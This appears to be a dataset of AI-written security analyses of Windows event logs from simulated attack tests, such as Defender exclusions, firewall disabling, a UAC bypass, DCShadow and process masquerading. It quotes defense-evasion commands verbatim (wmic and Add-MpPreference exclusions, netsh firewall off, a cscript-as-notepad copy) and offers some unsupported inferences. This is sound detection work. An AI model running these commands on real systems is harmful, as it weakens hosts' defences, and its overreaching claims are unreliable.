3. **MicrosoftEdgeUpdate.exe in Temp Directory**: This is unusual behavior for Edge update binaries, which typically reside in a consistent directory structure. Execution from a temp directory could suggest sideloading or tampering, contributing to suspicion.

### Assessment of Situation

- **Suspicious PowerShell Script**: The activity related to adding `.exe` file exclusion could indicate an attempt to bypass security mechanisms.
- **Sysmon Process Activity**: Presence of strategic commands like `whoami.exe` combined with PowerShell activity adds to suspicions regarding user actions on the system.
  
### Recommendations:

- **Investigate the PowerShell Execution**: Confirm if the PowerShell scripts that exclude `.exe` files from malware scanning are legitimate administrative actions or unexpected.
- **Review User Account Activities**: Examine activities related to `admin_test` to ensure no unauthorized or malicious intent.
- **Cross-Verify Log Integrity**: Given potential use of `wevtutil.exe`, confirm that security event logging has not been altered or manipulated.
  
### Final Resolution

**SUSPICIOUS**: The presence of potentially malicious PowerShell commands altering security settings necessitates further investigation. This activity does not conclusively point to compromise but warrants a deeper look to ensure security integrity and rule out threat activities. Proceed with caution and initiate appropriate investigation protocols."
WMIC Tamper with Windows Defender Evade Scanning Folder,"Upon investigating the series of Windows event logs provided from the CEO machine, several indicators suggest suspicious and potentially malicious activity. Below, I detail the findings based on the different logs analyzed:

### Sysmon Logs

1. **Frequent Execution of System Utilities:**
   - Multiple entries in the Sysmon logs indicate frequent execution of several system utilities such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `cmd.exe`. While these processes can be legitimate, their frequent and nearly concurrent execution can indicate automation or scripting, potentially employed by an attacker.
   
2. **Execution of `wmic.exe` to Modify Defender Exclusions:**
   - A particularly suspicious entry is the use of `cmd.exe` to execute `wmic.exe` with the following command line: 
     ```
     ""cmd.exe"" /c wmic.exe /Namespace:\\root\Microsoft\Windows\Defender class MSFT_MpPreference call Add ExclusionPath=\""file\""
     ```
     Modifying Windows Defender exclusions using WMIC suggests an attempt to weaken security controls, a common tactic during compromise efforts to avoid detection by antivirus programs.

3. **High-Integrity Level Processes:**
   - The processes including PowerShell, cmd, and the aforementioned system utilities are noted running at a ""High"" integrity level, implying administrative privileges are being exploited, potentially without CEO or IT administrative awareness.

### Time Anomalies

- Events from the Sysmon and Time Service logs indicate a change in system time. This may occur accidentally or deliberately, indicative of Timing-Based Evasion techniques to confuse log monitoring systems or to ensure timestamps align with an attacker's active periods rather than corporate hours.

### Risk Assessment
- The pattern of frequently executed system administration utilities, especially the use and modification of security settings, underscores a significant risk of compromise. These logs suggest that an adversary might have administrative access and is attempting to maintain persistence or evade detection.

### Conclusion and Recommendations

- **Threat Level:** SUSPECTED COMPROMISE. The activities are suspicious and require immediate attention to determine if there is an ongoing breach.
- **Resolution:** **MALICIOUS**
  
  
### Action Steps:
1. **Immediate Isolation:**
   - Isolate the CEO’s device from the network to prevent potential lateral movement by attackers or exfiltration of sensitive data.
   
2. **Conduct a Full Malware Scan:**
   - Use updated antivirus and endpoint detection software to conduct a full scan of the system for known malicious patterns or signatures.
   
3. **Analyze Network Logs:**
   - Review network logs around the time of suspicious activities for potential command and control (C&C) communications or unauthorized access points.
   
4. **Review User Activity:**
   - Check logs for any unauthorized logins or access patterns deviating from normal user behavior on the CEO's system.

5. **System Hardening:**
   - Reinforce security measures, including but not limited to, Windows Defender policies, minimizing administrative privileges, employing multi-factor authentication (MFA), and enabling advanced threat protection features.

6. **Forensic Analysis:**
   - It may be beneficial to engage a digital forensics team to conduct a detailed analysis of the system's disk image to identify any remnants of adversary tactics, techniques, and procedures (TTPs) not visible at the surface level.

By taking the above actions, it is possible to secure the environment further and mitigate any potential damage from the observed suspicious activity."
Disable Microsoft Defender Firewall,"To analyze the provided logs and assess the potential for malicious activity, let's examine various aspects in the logs:

1. **Application Log:**
   - Event from `Microsoft-Windows-Security-SPP` about the Software Protection Platform Service (EventID 16384) does not indicate anything malicious. This service is part of Windows activation and licensing mechanisms.

2. **System Log:**
   - Multiple events indicate changes to system time (`EventID` 1 and 24 by `Microsoft-Windows-Kernel-General`). While time changes can sometimes be used to tamper with logging or bypass security measures, there's no clear indication of malicious activity here. The primary change appears to be synchronization-related.
   - `Service Control Manager` EventID 7040 indicates a change in the startup type of ""IKE and AuthIP IPsec Keying Modules"" from demand start to auto start. While this can be indicative of a system configuration change, it does not necessarily imply malicious intent without additional context.

3. **Security Log:**
   - `EventID` 4672 and 4624 indicate the granting of special privileges and successful logon events. The `admin_test` account logs in with high privileges (SeDebugPrivilege, SeTakeOwnershipPrivilege, etc.). Such privileges can be indicative of administrative tasks, but in an unusual context, they can suggest potential privilege escalation. The login method using NTLM (LogonType 3) from a specific workstation and IPs could be reviewed for legitimacy based on typical behavior patterns.
   - `EventID` 4634 indicates a logon session was closed, which is expected following successful logon events.

4. **Sysmon Log:**
   - Numerous entries indicating execution of processes like `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `netsh.exe`. Notably, the `netsh.exe` command is used to disable the firewall (`netsh advfirewall set currentprofile state off`), which is particularly suspicious and indicative of potential malicious activity if performed without legitimate reason.
   - The command-line operations (`cmd.exe`) involved in disabling the firewall raise red flags as this action could be used to hide ongoing malicious activities by opening the system to network threats.

**Assessment:**
- **Suspicious Activity Identified:** The disabling of Windows Firewall using `netsh` followed by the administrative user `admin_test` performing various command-line actions makes the activity appear suspicious. The use of high-level privileges and NTLM authentication further supports the need for deeper investigation.

**Resolution: SUSPICIOUS**
- **Identified Threats/Risks:**
  - Potential unauthorized changes to system security settings (disabling of the firewall).
  - Unusual administrative activities may suggest a compromised or misused privileged account.

**Guidance:**
- Conduct a full review of the account `admin_test` to verify legitimacy and recent activities.
- Investigate the source and context of the `netsh` command disabling the firewall to determine if it was authorized or a result of a breach.
- Correlate any other logs or EDR alerts related to this timeframe for additional indicators of compromise.
- Consider enabling stricter logging and auditing on privileged accounts and reviewing firewall policies to prevent unauthorized modifications.
- Restore and enforce the security settings, particularly re-enabling the firewall, if found disabled or misconfigured without authorization."
UACME Bypass Method 39,"Based on the provided Windows event logs, let's analyze the factors that contribute to suspicious or potentially malicious activity:

### Analysis of Logs:

1. **Process Execution and Command Line Arguments:**
   - The log entry `Sysmon EventID=1` involving `cmd.exe` with the command line argument that executes a file named `Akagi64.exe` from a temporary directory is suspicious. This activity includes the execution of a tool commonly associated with privilege escalation and UAC Bypass techniques. It was triggered by a PowerShell script, which is often employed in malicious activities.
   - The `Image`: `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\uacme\\39 Akagi64.exe` suggests the use of an unauthorized or potentially dangerous tool located in a temporary folder (`AppData\Local\Temp`), which is often used by malware to execute payloads.

2. **Integrity Level:**
   - The process `cmd.exe` running at a `High` integrity level is indicative of administrative rights, suggesting a deliberate attempt to perform privileged operations, likely to elevate permissions for the `Akagi64.exe` tool.

3. **Process Ancestry and Parent-Child Relationships:**
   - The parent process of the PowerShell execution is `C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe`, indicating a script executed commands within PowerShell, escalating privileges with potential malicious intent.

4. **Use of PowerShell:**
   - PowerShell execution by `SERVER002\\admin_test`, which looks intentionally crafted to hide actions (""cmd /c echo"" with a path manipulation), indicates potential scripting designed to be stealthy and evade detection. This further solidifies potential misuse of PowerShell for lateral movement or payload deployment.

5. **Non-standard Tool Usage:**
   - The tool `Akagi64.exe`, part of a known exploit (uacme project), used for bypassing User Account Control (UAC), indicates a malicious intent to elevate privileges without user consent.

6. **Hashes and File Integrity:**
   - The `SHA256` hash for `cmd.exe` executing the suspicious command matches a potential indicator of compromise (IoC).

### Other System Activity:
- Much of the remaining activity appears normal, involving common Microsoft processes like updates for Microsoft Edge and other standard Windows task management operations. The majority of background processes reference services executed by the `NT AUTHORITY\SYSTEM`, which are typical for trusted Windows services.

### Conclusion and Resolution:
Given the analysis above, there are indicators of potentially **malicious activity** specifically focused around the suspicious execution of `Akagi64.exe`, which is indicative of using exploits for privilege escalation. The manner, directory, and associated scripting with elevated privileges suggest a compromise attempt.

**Resolution: MALICIOUS**

### Guidance Forward:
- **Immediate Action**: Monitor the affected host for further unauthorized access attempts or suspicious scripts.
- **Investigation**: Conduct thorough scanning and utilize endpoint detection to isolate and neutralize the threat. Check for persistence mechanisms and additional payloads.
- **Mitigation**: Review security posture regarding PowerShell usage, restrict its use, and enforce policies and rules to avoid unauthorized scripts.
- **Incident Handling**: Report the incident to the relevant cybersecurity team and proceed with incident response activities, potentially involving analysis of affected systems, network segments, full incident recovery procedures, and forensic investigation where needed.

Take preventive steps to ensure stricter control over administrative rights and potentially reimage affected systems to ensure no remnants of the malicious payload remain."
InstallUtil class constructor method call,"Upon analyzing the given Windows event logs, a few observations stand out that suggest potential suspicious and possibly malicious activities:

### Security and System Logs:
- **Time Manipulation (Event ID 4616)**: The security logs indicate adjustments to the system time with Event ID 4616. Such time change events, especially when frequent and unexpected, can be a tactic employed by attackers to mislead log timelines, potentially complicating investigations.
- **Service Host Execution (svchost.exe)**: This is a legitimate Windows process, however, frequent initiation or unusual parent-child process relationships can sometimes indicate malware activity using svchost.exe as a cover.

### Windows PowerShell Logs:
- **Suspicious PowerShell Activity**: The logs show PowerShell scripts being executed (Event ID 600), involving the 'Add-Type' cmdlet to manipulate .NET objects, which can be an indication of script-based attacks leveraging PowerShell to execute potentially harmful code.
- **InstallUtil Using PowerShell**: This is particularly concerning as InstallUtil.exe is a common method for executing code stealthily without writing any files to disk, often used in ""living off the land"" attacks.

### Sysmon Logs:
- **Creation of Suspicious Processes**: Multiple uses of csc.exe (C# compiler), cvtres.exe, InstallUtil.exe, and wevtutil.exe under high integrity level suggest potential post-exploitation activities or malware attempting to exploit .NET and Windows utilities for scripting and executing custom assemblies.
- **Frequent High Integrity Level Scripts**: Observing scripts running at high integrity levels is suspicious unless they are known and documented processes, as attackers often use high integrity to access sensitive system areas.
- **Microsoft Edge Update in Temp Location**: Repeated execution of Microsoft Edge Update related executables from temp directories (e.g., ""C:\\Program Files (x86)\\Microsoft\\Temp\\EU697E.tmp\\"") is unusual as typically, these would operate in proper, signed, and verified locations. This could denote an attempt to disguise malicious activity under legitimate process names.

### Conclusion:
The collected logs demonstrate behavior typical of system exploitation and post-exploitation activities. There is evidence of potentially malicious PowerShell activity, leveraging system tools (like InstallUtil.exe), and running processes from non-standard paths. These are classic tactics in targeted attacks or attempts to maintain persistence and execute unauthorized commands stealthily.

**Resolution: MALICIOUS** 

### Guidance on How to Proceed:
1. **Immediate Containment**: Disconnect the affected system from the network to prevent further propagation.
2. **Forensic Analysis**: Conduct a full disk forensic analysis and memory dump to capture all potentially malicious operations and data.
3. **Review User Accounts and Permissions**: Verify all user accounts to check for any unauthorized accesses or changes.
4. **Monitor and Remove if Needed**: Use an updated antivirus/antimalware tool to conduct a deep system scan, and quarantine or eliminate any detected threats.
5. **Log and Alert Configurations**: Enhance logging to capture more detailed process command-line activities and consider implementing specific alerts for svchost.exe, InstallUtil.exe, and PowerShell suspicious activities.
6. **Communication with Management and Affected Parties**: Notify the necessary stakeholders, such as management and IT teams, to ensure coordinated incident response and remediation efforts.
7. **Incident Response Plan**: Follow up with an incident response plan update, including lessons learned to strengthen security posture against similar future incidents."
Allow Executable Through Firewall Located in Non-Standard Location,"Upon reviewing the provided Windows event logs, there are several points to consider for determining the nature of the activity:

1. **Process Execution and Command-Line Analysis**:
   - The logs show a PowerShell command execution where a file `fileTest.exe` is copied to a user directory and a firewall rule is added to allow it. This behavior is unusual and potentially indicative of malicious activity, as it involves a script that moves an executable into a user-specific directory and modifies firewall rules to permit its operation (`Add rule name=""file Test""`). Typically, legitimate administrative scripts would not need to adjust firewalls or move executables without clear necessity or user interaction.
   
2. **Privilege Levels**:
   - Events show executed processes by the user `SERVER002\\admin_test` with high integrity levels, suggesting escalated privileges. The combination of high privileges and suspicious activity like modifying firewall rules raises concern.

3. **Unusual Process Creation**:
   - The Sysmon logs reveal processes like `wevtutil.exe` and `conhost.exe` executed in rapid succession, typically associated with normal Windows operations but potentially suspicious without context. Yet, this pattern alone is not explicitly malicious unless linked to specific higher-risk actions.

4. **File System Operations**:
   - The presence of PowerShell and associated commands copying and executing files in a temporary directory raises concerns, especially when combined with a custom firewall rule to allow the execution of `fileTest.exe`. This pattern is reminiscent of techniques often used in malware deployment or lateral movement within a network.

5. **Edge Update Logs**:
   - The frequent updates related to Microsoft Edge, while legitimate, are heavily logged. Without context, they appear normal but should be validated against scheduled update activities to ensure they are not used as a cover for other activities.

6. **Summary and Guidance**:
   - The log analysis indicates the presence of behavior which is SUSPICIOUS. Specifically, the use of PowerShell to execute scripts that manipulate firewall settings and handle executables warrants further investigation.
  
   - **Actionable Steps**:
     - Conduct a deeper forensic analysis on `fileTest.exe` to determine its origin and potential impact.
     - Verify the legitimacy of the PowerShell commands executed and the intention behind the modification of firewall rules.
     - Check if similar activity has been observed on other machines to identify a pattern or campaign.
     - Review and audit firewall rules, particularly those added or modified during the timeframe observed in the logs.

Based on the evidence, the resolution is marked as **SUSPICIOUS** due to consistent patterns with potentially malicious script-based activity requiring further analysis to confirm any threats or risks."
LockBit Black - Use Registry Editor to turn on automatic logon -cmd,"After analyzing the provided event logs, the following points have been identified that indicate suspicious activity:

1. **Frequent Execution of System Utilities**: The logs show multiple instances of `wevtutil.exe` and `conhost.exe` being executed. While these tools are legitimate Windows utilities, `wevtutil.exe` is often utilized in attacks to manipulate or clear event logs, which can help cover tracks after malicious activities. The large number of conhost executions alongside wevtutil might indicate script-driven or automated processing.

2. **Registry Changes via `cmd.exe`**: A `cmd.exe` process executed a series of commands to modify registry keys associated with automatic login. Specifically, it modifies the `AutoAdminLogon`, `DefaultUserName`, `DefaultDomainName`, and `DefaultPassword`. These actions directly impact system security settings, and configuring automatic login (especially with administrator privileges) is suspicious and a common tactic used by attackers to maintain access.

3. **High Integrity Level Processes**: Several processes are noted to have a high integrity level, indicating they have significant permissions on the system. This, in combination with the registry modifications, increases the risk of system compromise.

4. **Execution of `whoami.exe`**: The execution of `whoami.exe`, a tool used to display user information, might suggest that someone is trying to gather information about user privileges or confirm the current security context.

5. **Centralized Execution from `wsmprovhost.exe`**: Many processes are spawned from `wsmprovhost.exe`, which is tied to Windows Remote Management. This can suggest that the activity is being controlled remotely, which is suspicious especially if the pattern is not typical for this user or machine.

6. **Potential Time Manipulation**: Changes in system time were logged (EventID 4616). While not inherently malicious, this can be a sign of an attacker attempting to confuse log timelines.

Given the indicators above, especially the registry changes to facilitate auto-login with credentials, the frequent execution of event-related utilities, and the potential signs of remote manipulation, this collection of logs does indicate a high likelihood of malicious activity.

**Resolution: MALICIOUS**

**Guidance:**
- Immediate action should be taken to verify and secure the CEO's machine.
- Confirm suspicious registry changes and revert any unauthorized modifications.
- Investigate how these changes were permitted and the source of commands if possible.
- Review network logs and other endpoints for connected suspicious activity.
- Enhance monitoring around similar utilities or registry modifications in the network.
- Consider a full threat hunt and potential forensic analysis on the machine to determine the extent of compromise and eradicate any persistence mechanisms."
Windows HideSCAPower Group Policy Feature,"Upon reviewing the provided Windows event logs, several activities stand out that warrant further discussion:

### Suspicious or Anomalous Behavior:

1. **Registry Modification:**
   - Event ID 17979 and 17981 in the Sysmon Log record the execution of `cmd.exe` and `reg.exe` to modify a registry key: `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer, HideSCAPower`. This action was executed with high integrity-level privileges.
   - Command used: `""cmd.exe"" /c reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v HideSCAPower /t REG_DWORD /d 1 /f`.

2. **Frequent Process Launches:**
   - Multiple instances of `wevtutil.exe` and `conhost.exe` were executed in quick succession by the user `SERVER002\admin_test`. This may indicate an automated script or command sequence running tasks back-to-back.
   - Presence of `wevtutil.exe` which can be used for event log manipulation is also recorded.

3. **Process Execution with High Privileges:**
   - The execution of `whoami.exe` and `HOSTNAME.EXE` by the same user with high integrity levels appears normal for administrative checks but could be part of privilege reconnaissance.

4. **Edge Update Activities:**
   - The logs depict multiple activities regarding `MicrosoftEdgeUpdate.exe` processes, indicating a potentially scheduled update or misconfigured system. The use of `update` and `/regsvc` commands fit normal operations for software updates but confirming their authenticity is recommended.

### Assessment:

- The registry modification event appears particularly suspicious due to its direct impact on system policies and user interface changes. While the addition of a registry key to hide certain Explorer shell capabilities could be a legitimate administrative action, it also aligns with tactics commonly used in persistence mechanisms by adversaries. Furthermore, the time-sequenced launching of system utilities like `wevtutil.exe` could be indicative of potential malicious behavior like event log clearing or system information gathering.

### Identified Threats or Risks:

1. **Potential Unauthorized Registry Modification:**
   - The modification to Explorer settings demands verification of administrator intent and appropriateness. If unauthorized, this could suggest breach attempts for persistent access or stealth.

2. **Abnormal Utilization of System Utilities:**
   - The high frequency of utility executions, especially those capable of manipulating system logs and settings, might suggest scripted or controlled actions typically seen during either system misconfigurations or stealth activities by malicious entities.

### Guidance on Resolution:

- **Resolution: SUSPICIOUS**
  - The activities, particularly the registry modification and the frequent execution of specific utilities, appear suspicious and warrant deeper investigation.
  - Initiate an audit trail verification to confirm whether these logs align with legitimate administrative tasks.
  - Conduct a thorough endpoint analysis to assess any potential compromise vectors related to these events.

DCShadow (Active Directory),"Upon reviewing the provided Windows event logs, several suspicious activities stand out that suggest malicious behavior potentially indicative of a security compromise. Here is a detailed analysis of the events:

1. **Suspicious PowerShell Activity**: The logs reveal the use of PowerShell to execute a complex command involving sensitive actions. The following indicators are evident:
    - **Mimikatz Execution**: There is a command to execute ""mimikatz.exe"" with parameters related to ""lsadump::dcshadow"" which targets a specific user object (""bruce.wayne"") and modifies Active Directory attributes. Mimikatz is a well-known tool for credential dumping, and its use is generally considered a high indicator of malicious activity.
    - **DCShadow Attack**: The use of ""dcshadow"" technique within mimikatz indicates an attempt to alter or replicate directory objects stealthily, typically signaling a sophisticated attack attempting to escalate privileges or persist within the environment.
    - **Use of PsExec**: The PowerShell script invokes `PsExec` to run Mimikatz as SYSTEM, further elevating privilege levels.

2. **Process Execution Patterns**: 
    - The sequence of events shows multiple executions of system utilities like `hostname.exe`, `whoami.exe`, and these could be attributed to confirming network and user information post-compromise.
    - The sequence aligning with suspect command invocations underscores potential reconnaissance activities.

3. **Timing and Execution Context**:
    - The activity is performed under a high integrity context by a non-standard user account (SERVER002\admin_test), which may have been compromised.
    - Execution of powerful scripts in a short period is atypical for normal administrative tasks and points toward scripting for malicious automation.

4. **Application and System Logs Analysis**:
    - Logs show the consistent state of Windows Defender being on, which might indicate attempts to evade or a possibility of alerts being overlooked.
    - Lack of any direct alerts from security logs in the scope provided doesn’t offer relief, rather implies sophisticated evasion or probing.

**Assessment and Conclusions**:
- The logs collectively suggest significant evidence of potentially malicious activity. The use of Mimikatz and techniques like `dcshadow` are serious indicators of an Active Directory attack aiming for privilege escalation and data manipulation.
- Given the tools and techniques used, this is likely an indicator of an intrusion involving Advanced Persistent Threats (APTs) given their complexity and nature.

**Resolution: MALICIOUS**

**Guidance on How to Proceed**:
1. **Immediate Containment**: Isolate the affected host (Server002) from the network to prevent further spread or damage.
2. **Comprehensive Investigation**: Conduct a full forensic analysis on the affected machine and correlate with network logs to understand the full extent of the breach.
3. **Incident Response**: Notify relevant stakeholders and initiate an incident response plan including resetting compromised credentials and reviewing access permissions.
4. **Remediation and Strengthening**: Apply security patches, review and restrict administrative privileges, enhance monitoring, and consider specific defenses against lateral movement and credential theft attacks.
5. **Monitoring & Alerts**: Implement enhanced logging and real-time alerting for similar indicators of compromise across other endpoints.

This situation demands a robust and multi-faceted response to ensure containment, eradication, and recovery from the potential breach.
"
Lockbit Black - Use Registry Editor to turn on automatic logon -Powershell,"Upon reviewing the provided logs from the Windows host, here are the key findings:

1. **Use of PowerShell to Modify Registry Keys for Auto Logon:**
   - The logs show a PowerShell command executed to modify registry keys related to Windows auto logon settings (`HKLM:\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon`). This command includes setting values for `AutoAdminLogon`, `DefaultUserName`, `DefaultDomainName`, and `DefaultPassword`.
   - The command involves creating or modifying these registry keys with high integrity level, which suggests the session was running with elevated privileges. The provided command syntax directly indicates a potential security risk, as it sets an auto logon feature with specific user credentials, which can be used to gain unauthorized access to the system automatically.

2. **Repeated Execution of Built-in Windows Utilities (wevtutil.exe, conhost.exe, hostname.exe, whoami.exe):**
   - We see several executions of built-in utilities such as `wevtutil.exe`, `hostname.exe`, and `whoami.exe`. While these tools can be used for legitimate administrative purposes, their use in conjunction with the PowerShell activity warrants a closer look.
   - The sequence of events shows a pattern aligned with attempts to gather system information (`hostname.exe`, `whoami.exe`), potentially as a precursor to further exploitation or escalation.

3. **Absence of Legitimate Edge Update Activity:**
   - There are also logs associated with `MicrosoftEdgeUpdate.exe`, which generally indicate automatic updates of the Microsoft Edge browser. There is nothing particularly suspicious upon examining these logs, as they follow a typical update pattern.

**Assessment and Conclusion:**
The execution of PowerShell with the specific command to alter registry settings for automatic logon with predefined credentials is a significant red flag. This behavior is not typical of standard legitimate activities and suggests a potential for unauthorized system access, possibly orchestrated by an attacker who has already breached the system's defenses.

**Resolution: MALICIOUS**
The identified PowerShell activity is a clear indicator of malicious intent due to the nature of altering sensitive registry keys for automatic login. Immediate actions should include:
- Investigating how unauthorized access to the PowerShell environment was obtained.
- Identifying and neutralizing any potential footholds the attacker may maintain.
- Performing a thorough audit of affected systems to determine the extent of compromise.
- Resetting affected credentials and ensuring proper access controls are reinforced.
- Regular monitoring and alerting for similar behaviors in other systems."
Tamper with Windows Defender Evade Scanning -Folder,"Upon analyzing the provided Windows event logs, several activities suggest potentially suspicious behavior. Here is a detailed analysis:

### Analysis:

1. **PowerShell Events:**
   - **Ad-MpPreference** in PowerShell is used to add an exclusion to Windows Defender. This can often be a sign of malicious activity, as attackers might exclude directories to prevent detection.
   - The command executed is `Add-MpPreference -ExclusionPath ""C:\\Temp""`, which appears in multiple PowerShell events. This operation was performed by the user `SERVER002\admin_test`, which warrants attention given its potential to hide malicious files from antivirus scans.

2. **Security Events:**
   - **Event ID 4672**: Admin privileges are being used. The account `admin_test` utilized several high-level privileges like `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`, which are commonly exploited by malware or attackers to escalate privileges.
   - Multiple successful logon events for `admin_test` account from a specific machine (WORKSTATION `DESKTOP-3HL5B2P`) noted using the NTLM authentication. This could indicate compromised credentials.

3. **Sysmon Events:**
   - Execution of `wevtutil.exe` and `conhost.exe` by `SERVER002\admin_test` could indicate attempts to manipulate event logs or execute commands via command-line interfaces, which is often performed during/after a compromise.
   - The repeated execution of utilities like `hostname.exe` and `whoami.exe` can signal reconnaissance efforts to understand the host environment.

4. **Application and System Logs:**
   - **Edge Update**: Multiple logs associated with Microsoft Edge Update operations, including executions from temp folders, might appear habitual due to software updates; however, the significant overlap in time with suspicious PowerShell and Sysmon activities is worth investigating further.
   
### Assessment:

The presence of PowerShell commands attempting to manipulate Windows Defender settings, the usage of an admin account with high-level privileges, combined with suspicious command executions as logged in Sysmon, collectively represent behavior that deviates from normal system operations.

### Conclusion:

- **Resolution: SUSPICIOUS**

This activity doesn't outright confirm a malicious compromise, but it has enough red flags to warrant further investigation. In particular:
- Investigate the source and intent of the PowerShell script that alters Defender settings.
- Perform threat hunting for potential threats residing in excluded paths.
- Conduct a thorough analysis of the `admin_test` account activities and check if the behavior aligns with expected usage patterns.
- Review network traffic for any signs associated with data exfiltration or remote access.

### Guidance:

- Isolate the system if possible and perform a comprehensive investigation of the `C:\Temp` directory to ensure no concealed malware exists.
- Cross-reference with any available threat intelligence to check for known indicators of compromise (IOCs).
- Encourage use of multi-factor authentication and consider tightening security controls around privilege escalation and PowerShell execution within the enterprise environment.

By taking these steps, you can better understand the environment's security posture and enhance defenses against possible breaches."
Masquerading - cscript.exe running as notepad.exe,"Based on the provided event logs, here is the detailed analysis and assessment of the potential threats or risks:

### Anomalous and Suspicious Behavior:

1. **Use of Command Line by Suspicious Processes**:
   - A critical observation is the execution of the `cmd.exe` with the command: 
     ```
     ""cmd.exe"" /c copy %%SystemRoot%%\\System32\\cscript.exe %%APPDATA%%\\notepad.exe /Y & cmd.exe /c %%APPDATA%%\\notepad.exe /B
     ```
   - This command is unusual as it attempts to copy `cscript.exe` to `notepad.exe` in the APPDATA directory and then execute it. This is indicative of a masquerade technique and is commonly associated with malicious behavior.

2. **Execution of `notepad.exe` from `AppData` Roaming folder**:
   - The execution of a renamed `cscript.exe` as `notepad.exe` from a non-standard location implies an evasion technique, potentially used to inject or execute malicious scripts or payloads stealthily.

3. **Use of `wevtutil.exe` and `whoami.exe`**:
   - The frequent invocation of `wevtutil.exe` and `whoami.exe` in a short span suggests reconnaissance or event log cleaning activities, typically performed by adversaries to cover tracks.

### Indications of Malicious Activity:

- The combination of the above behaviors, particularly copying system binaries to disguise as `notepad.exe`, executing the renamed file, and additional suspicious command line actions strongly indicate malicious intent.
- The use of legitimate Windows tools in suspicious ways to achieve objectives like persistence, privilege escalation, or data exfiltration is characteristic of sophisticated attack vectors.

### Assessment and Guidance:

Given the context and analysis, these logs point towards potentially malicious activity. The specific command-line executions and the abnormal process behaviors observed signify a possible compromise or active threat on the system.

**Resolution**: **MALICIOUS**

### Recommended Actions:

1. **Immediate Isolation**: Isolate the affected system (Server002) from the network to prevent any further spread or exfiltration of data.
2. **In-depth Forensic Analysis**: Conduct a comprehensive forensic investigation to evaluate the full scope of the breach, focusing on file modifications, network activity, and further persistence mechanisms.
3. **Threat Neutralization**: Remove any discovered persistence mechanisms, unauthorized software or scripts, and verify the integrity of the compromised system files.
4. **Security Posture Improvement**: Review and enhance security policies, such as application whitelisting, and implement advanced detection mechanisms to prevent similar incidents.
5. **User Education**: Conduct awareness sessions for users to recognize signs of phishing or social engineering attempts that often precede such breaches.

Acting swiftly on these recommendations will be crucial in mitigating this threat swiftly and effectively."
Set-Up Proxy Server,"Upon analyzing the provided Windows event logs, there are several observations that stand out regarding potential suspicious activity:

1. **Kernel Events and Time Adjustments**:
    - There are repeated adjustments to the system time from `18:07:52.0724524` to `18:08:15.1021026`. These changes are initiated by the `svchost.exe` process, as seen in the System and Security logs (Event ID 4616).
    - Time adjustments by `svchost.exe` are typical as this process handles many system service hosts, including time synchronization. However, if the time-change frequency is unusually high or coincides with malicious activity, it could be suspicious.
    - In this case, the time adjustments appear to be aligned with regular Windows Time Service operations, as corroborated by an event indicating the time source `time.windows.com`.

2. **Registry Modification**:
    - The Sysmon logs show a `cmd.exe` process with a command line that adds a registry entry for a proxy server (`proxy.file-test.com:8080`). This action was executed with high integrity level by a user named `admin_test`.
    - This action can be suspicious since unauthorized changes to proxy settings could indicate an attempt at redirecting network traffic.

3. **Process Execution**:
    - In the Sysmon logs, there are multiple command-line executions of `cmd.exe`, `reg.exe`, and utility tools like `whoami.exe`. The `whoami` and `hostname` commands are typically harmless, used for checking system or user information. However, in the context of concurrent unexpected actions, they could indicate an attacker is enumerating details about the compromised environment.
    - The execution of these utilities is performed by the same user, `admin_test`, and shows a pattern of legitimate administrative user activity. However, the registry change remains questionable without proper change control justification.

4. **High-Privilege Logon Events**:
    - A logon event (Event ID 4624) for the SYSTEM account with the `SeDebugPrivilege` and others suggests the execution of privileged commands.
    - Privileged actions right after a logon session could indicate either regular administrative tasks or preparatory steps for malicious actions, especially if unusual patterns of execution or changes ensue.

5. **Updates and Services**:
    - A Windows Update Client event indicates a Defender antivirus definition update, which is normal system behavior to maintain security currency.

### Assessment:
The logs show a mix of typical system activity and actions that may warrant further investigation. The primary points for further exploration involve the registry modification to the proxy settings and concurrent high-integrity level execution of command-line utilities. These actions, alongside numerous time adjustments, could suggest potential undesirable use of administrative credentials.

### Recommendations:
- Validate the legitimacy of the user `admin_test` and verify whether recent administrative activities coincide with a known schedule or task.
- Investigate the necessity and authorization of recent proxy settings changes. Confirm with IT or network teams if they were expected.
- Monitoring for any unexpected external communications or further anomalous behavior related to the adjusted proxy.
- If necessary, run additional endpoint detection and response (EDR) scans and use network monitoring tools to detect any signs of successful compromise or data exfiltration.

### Resolution:
**SUSPICIOUS** - The logs do not conclusively demonstrate malicious activity, but there are enough indicators to warrant a more detailed investigation to either confirm benignity or uncover potential threats."
Registry-free process scope COR_PROFILER,"**Analysis of the Logs**

Upon analyzing the provided Windows event logs from the CEO's machine, I have identified the following suspicious activities and potential indicators of malicious behavior:

1. **PowerShell Usage with Suspicious Arguments**:
   - The PowerShell log entries indicate command-line arguments involving `COR_ENABLE_PROFILING`, `COR_PROFILER`, and `COR_PROFILER_PATH` with references to a profiler CLSID and a suspicious DLL path: `""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.012\\bin\\data.012x64.dll""`.
   - These settings are commonly associated with `.NET` profiling, which could be abused by malware for injection and persistence mechanisms.

2. **Failed .NET Profiler Loading**:
   - The Application log highlights a .NET Runtime error where the loading profiler failed with the CLSID `{09108e71-974c-4010-89cb-acf471ae9e2c}`. This corresponds to the PowerShell activities and suggests possible tampering or misuse of profiling.

3. **Frequent Use of `wevtutil`**:
   - The Sysmon logs indicate multiple executions of `wevtutil.exe`, which can be used by attackers to clear event logs and cover their tracks.

4. **Processes Executed in High-Integrity Context**:
   - Several processes, including PowerShell and `whoami`, are executed with high integrity levels. This execution context can be considered privileged and potentially abused by malware.

5. **Edge Update Activity**:
   - There are frequent entries for Microsoft Edge Update processes, which is a common scheduled task. However, erroneous implementations or manipulation by attackers can be used to deploy payloads or maintain persistence.

6. **Spawning of Numerous Child Processes**:
   - The sequence of activities in the Sysmon logs shows a cascade of process creations originating from PowerShell and other processes. This behavior indicates script-based automation, which can be suspicious depending on the context.

**Assessment of the Situation**

